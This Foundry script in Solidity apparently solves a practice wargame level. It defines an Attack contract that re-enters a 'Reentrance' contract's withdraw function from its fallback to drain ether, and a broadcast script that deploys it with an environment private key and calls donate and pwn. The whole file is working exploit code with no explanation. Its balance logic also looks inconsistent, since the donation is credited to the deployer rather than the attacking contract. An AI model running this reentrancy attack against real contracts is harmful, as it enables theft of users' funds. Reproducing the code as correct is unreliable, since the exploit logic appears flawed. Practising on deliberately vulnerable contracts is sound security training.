// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
import "@forge-std/Script.sol";
import "../src/Re-entrancy.sol";

contract Attack {
    Reentrance public reentrance;
    address public attacker;
 
    constructor(address payable reentranceAddress) public{
        reentrance = Reentrance(reentranceAddress);
        attacker = msg.sender;
    }

    function pwn() public {
        reentrance.withdraw(reentrance.balanceOf(address(msg.sender)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function donate() public payable {
        reentrance.donate{value: msg.value}(address(msg.sender));
    }

    fallback() external payable {
        reentrance.withdraw(reentrance.balanceOf(address(attacker)));
    }
}


contract ReentranceScript is Script {
    Reentrance public reentranceContract;

    function setUp() public {
        reentranceContract = Reentrance(payable(vm.envAddress("REENTRANCE_CONTRACT")));    
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(reentranceContract));
        attack.donate{value: 1000000 wei}();
        attack.pwn();
        vm.stopBroadcast();
    }
}
